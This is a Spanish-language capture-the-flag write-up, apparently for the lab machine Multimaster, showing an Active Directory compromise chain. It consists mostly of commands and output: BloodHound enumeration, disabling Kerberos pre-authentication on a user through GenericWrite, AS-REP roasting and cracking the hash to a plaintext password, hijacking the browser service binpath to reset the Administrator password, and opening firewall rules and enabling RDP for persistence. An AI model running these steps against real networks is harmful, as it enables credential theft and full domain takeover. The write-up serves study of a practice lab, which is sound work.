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)

Monto un servidor con samba compartiendo el `SharpHound.exe` mientras que en otra pestaña levantó el bloodhound.

![](https://lh4.googleusercontent.com/DWVbLys7rQL9NLS3MYEBwc7LmJannfQxmX5R4JnvxnT1lQL9VmF9iQXJG-EmFt_fvLuDO14uITx6CSEYgZGOAYs_BKEn5vdfoC0PYP7TOgO87B7uHpLc75JdrvJs1tET8dcs5DP7)

![](https://lh5.googleusercontent.com/d_0MiLhE01ov8ThgvidaxEOlwPh1AD6PMIlnZz4bVUxlKJCm1H0CG842aKGSbTbm2shDtVCac1lrH1agu03mSZOb0LZXF_ZdNrEDv1wMPC3ePm4gFNnLh-6kp49GmAiKY9cZVOaU)

Ejecutó el `sharphound.exe`  y lo descargo.

```
*Evil-WinRM* PS C:\Temp> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 9:16 PM on 8/19/2020
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain MEGACORP.LOCAL using path CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 94 objects finished (+94 ì)/s -- Using 27 MB RAM
Enumeration finished in 00:00:00.3942144
Compressing data to .\20200819211627_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:16 PM on 8/19/2020! Happy Graphing!

*Evil-WinRM* PS C:\Temp> download 20200819211627_BloodHound.zip
Info: Downloading C:\Temp\20200819211627_BloodHound.zip to 20200819211627_BloodHound.zip

                                                             
Info: Download successful!
```
Después solo arrastramos el `.zip` al bloodhound y comenzamos a analizar todo lo que recolecto nuestro `sharphound.exe`.

![enter image description here](https://i.ytimg.com/vi/VvuBcsoSWBc/maxresdefault.jpg)

Indagando un poco encontramos que el usuario sbauer tiene permisos GenericWrite sobre el usuario jorden.

![](https://lh4.googleusercontent.com/WXvt0-tjPLnQm5uRjr4Jlsk8Oh_vLghUGrfDbF3LLOhP3cg3ZxevLP6mQV9-fK3z6gb8LaKpD0_XzAfqG6HGjron6EogxR5GIpuEB-NdeIF-wyKCGi1pMMdif2chT0HTlfQkq-W0)

# Ataque ASREPRoast.

Importamos el modulo de active directory y evitamos que jorden solicite pre-autenticación.

```console
*Evil-WinRM* PS C:\Users\sbauer\Documents> $username = "jorden"
*Evil-WinRM* PS C:\Users\sbauer\Documents> Import-Module activedirectory
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser $username | Set-ADAccountControl -doesnotrequirepreauth $true
```
Después utilizamos la herramienta `GetNPUsers.py` para obtener nuestro hash.

```console
intrusionz3r0@kali:~$ sudo GetNPUsers.py MEGACORP.local/sbauer:'D3veL0pM3nT!' -dc-ip 10.10.10.179 -request
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Name    MemberOf                                      PasswordLastSet             LastLogon  UAC      
------  --------------------------------------------  --------------------------  ---------  --------
jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 18:48:17.503303  <never>    0x410200 



$krb5asrep$23$jorden@MEGACORP.LOCAL:953abf0472fafe61916ce77ac7e6ebc5$984cc9f4b101ba52c0b77334950ed13f88c489efadcd76979d911e4b6dc18cf7439dbf3133d3e9d2f6e3a9f5090cf4c3bd30efebe2da216142793ea7b00be97b12a295ce7a9d1691d3a3680dd38a3cdb18486d657caf6eaae62ca26698c2882f5bd0b2ea354d55c26277106e3dfeb5390860dc5f1ba41b6c2adb44fe07b1d03f161c6085d34538b24228d49bc65c81b79e51fd8599f74f5fb8c8563b02b10da882666506979d287a2cd79c28b9b9ae5f7997517903993d05e3bb7a6c68744f9592ca21cc85c315dc962be07c5391fc1b856a883a42eb408d7e41ace9e61084a63ec89cddbe3ab1bbd44fa85e4b9eb25e
```

O bien con crackmapexec.

```console
intrusionz3r0@kali:~$ cme ldap multimaster.htb -u jorden -p '' --asreproast AR_REP --kdcHost 10.10.10.179
```

Ahora solo lo crackeamos el hash con nuestro amigo john y verificamos las credenciales con crackmapexec.

```console
intrusionz3r0@kali:~$ john -w=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)
1g 0:00:00:23 DONE (2020-08-20 00:03) 0.04170g/s 183544p/s 183544c/s 183544C/s rainian..rainemee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```console
intrusionz3r0@kali:~$ cme smb multimaster.htb -u jorden -p rainforest786       
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\jorden:rainforest786
```

# Shell como el usuario jorden.

```console
evil-winrm -i multimaster.htb -u jorden -p 'rainforest786'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents> whoami
megacorp\jorden
*Evil-WinRM* PS C:\Users\jorden\Documents>
```

Nuevamente comenzamos a enumerar.

# Abusando del servicio browser para obtener shell como SYSTEM.

```powershell
*Evil-WinRM* PS C:\Users\jorden\Documents> net user jorden
User name                    jorden
Full Name                    Jorden Mclean
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:48:17 PM
Password expires             Never
Password changeable          1/10/2020 5:48:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users         *Developers
The command completed successfully.
```

Podemos observar de que jorden pertenece al grupo de `SERVER OPERATORS`, los miembros de este grupo se les permite ejecutar, parar o modificar algunos servicios de la máquina, eso significa que podemos aprovecharnos de un servicio que se ejecute bajo el contexto de **SYSTEM** para poder ejecutar comandos o bien ejecutar un binario como **SYSTEM**.

En este caso abusaremos del servicio browser.

```powershell
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe config browser binpath="C:\Windows\System32\cmd.exe /C net user Administrator HolaA123!!"
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe qc browser
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe stop browser
*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start browser
```

```powershell
intrusionz3r0@kali:~$ evil-winrm -i multimaster.htb -u Administrator -p 'HolaA123!!'                                  

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megacorp\administrator
```

# Escritorio Remoto.

Antes de terminar me gustaría conectarme de manera remota a la máquina, para ello creo una regla de firewall que permita el trafico de entrada y salida por el puerto 3389.

```console
C:\Windows\system32>  netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
C:\Windows\system32>  netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
```
Después habilitamos el RDP modificando el registro.

```console
C:\Windows\system32>  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Por ultimo solo utilizamos  `remmina`  para conectarnos vía escritorio remoto.

![](https://lh4.googleusercontent.com/nTVDvTUiI3WY1BHRTpEEzfz-ADAH13gCRbzaAZsIsyyqfjsn4OgGF_aJQtXDLIBDrOGk_t71cqX3dAt9Xl4sTJDiWgHKn1C4m_BhOiDI_DfEUov5KoueeYh1Pu4R4HsI2_9WcrU0)

**¡¡Somos Administradores!!**

![enter image description here](https://i2.wp.com/media0.giphy.com/media/mQG644PY8O7rG/giphy.gif)

Espero te haya gustado, recuerda seguirme en mis redes sociales para estar al pendiente de todo mi contenido.

#### **¡Muchas Gracias!**
